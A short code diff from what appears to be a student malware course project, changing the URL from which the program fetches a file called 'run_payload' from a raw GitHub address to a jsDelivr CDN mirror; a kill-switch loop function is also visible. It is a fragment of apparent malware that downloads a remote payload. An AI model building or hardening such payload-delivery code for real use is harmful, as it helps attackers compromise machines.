@@ -18,7 +18,9 @@ import crypt
 
 
 THIS_FILE = os.path.realpath(__file__)
-BASE_FLAG_URL = "https://raw.githubusercontent.com/ucla-e1-malware/final-project-theoreos/main/run_payload"
+# BASE_FLAG_URL = "https://raw.githubusercontent.com/ucla-e1-malware/final-project-theoreos/main/run_payload"
+
+BASE_FLAG_URL = "https://cdn.jsdelivr.net/gh/ucla-e1-malware/final-project-theoreos@main/run_payload"
 
 def kill_switch_loop():
     while True:
